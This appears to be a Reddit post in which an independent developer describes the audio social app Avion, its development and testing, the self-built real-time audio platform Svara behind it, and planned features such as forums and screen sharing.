https://preview.redd.it/9ca1ym9nn4be1.png?width=4000&format=png&auto=webp&s=f9a133891d2cfb0e444f1ba6f8781944adbe9656

https://preview.redd.it/ezynkdbsn4be1.png?width=4000&format=png&auto=webp&s=c523d47328b3afe087c4a2877c1edd9ae9d72199

A **dedicated Feeds section** highlights live rooms, upcoming events, and activities from followed clubs, ensuring users never miss out on exciting conversations.

# Development and Testing

The development phase was focused on creating a smooth and user-friendly experience. I worked carefully to ensure every feature, from real-time audio capabilities to the Feeds section, functioned seamlessly. Special attention was given to the UI, ensuring it was intuitive and visually appealing. This phase took around two and a half months to complete, with every detail carefully refined to provide the best experience for users.

# Testing Phase

Testing was a critical step to ensure the app worked flawlessly. Multiple rounds of testing were conducted to check for bugs, improve performance, and ensure uninterrupted functionality. Each feature was tested thoroughly, including live audio, navigation, and responsiveness across devices. This phase lasted about 1–2 weeks and helped ensure the app was ready for users with no major issues.

# Powered by Svara

Svara is a real-time communication (RTC) platform designed for audio channeling. It allows users to connect through live audio in structured rooms, ensuring smooth and uninterrupted conversations. With tools for account creation, secure access, and one-time purchases, Svara is built to be user-friendly and efficient.

**Benefits of Svara:-**

\- Affordable Solution: Svara offers high-quality audio services at a much lower cost than other platforms, making it accessible to developers.

\- Reliable Performance: It ensures low latency and a stable audio connection for a great user experience.

\- Easy Integration: Developers can integrate Svara into their apps with ease, thanks to its flexible and customizable features.

\- Dedicated Support: Svara provides help with installation and answers to any queries, ensuring a smooth experience for developers.

\- Empowers Developers: By offering an affordable alternative, Svara helps developers create great audio-based apps without worrying about high server costs.

**The Backstory**

Svara was born out of a challenge I faced while working on Avion. Integrating audio channeling into the app was a big concern. While platforms like Agora offered excellent service, their high costs made them unaffordable for independent developers like me.

I decided to take on this challenge and build my own RTC platform. It was a tough decision as it required a lot of time, effort, and money. But I didn’t want my Avion project to remain incomplete.

Svara not only solved my problem but also became a helpful solution for other developers facing the same issue. It offers reasonably priced services and provides support for installation and queries, making it a practical choice for those building audio apps.

With Svara, I aimed to help developers like me create amazing apps without being held back by high server costs.

# Future Updates for Avion

**Integration of Forums**

A live chatting system will be added to enhance real-time text-based interaction.

**Screen Sharing in Rooms**

Introducing a screen-sharing feature within audio rooms will help users share visuals during conversations. This will be especially useful for business meetings, educational sessions, and presentations, making communication more effective and engaging.

These updates are designed to make Avion not just a social networking app but a comprehensive platform for connecting, learning, and growing.

I am constantly working to make Avion better and more engaging. Beyond the updates mentioned, I have many more exciting features planned for the future.

I am always happy to hear your suggestions and receive your valuable feedback. Whether it’s about improving the current app or server or even refining our ideas for future updates, your input matters to me a lot.

Don’t hesitate to reach out to me at contactus@arpahub.in with your thoughts or questions. Together, we can shape Avion into a platform that truly connects people in innovative and meaningful ways.
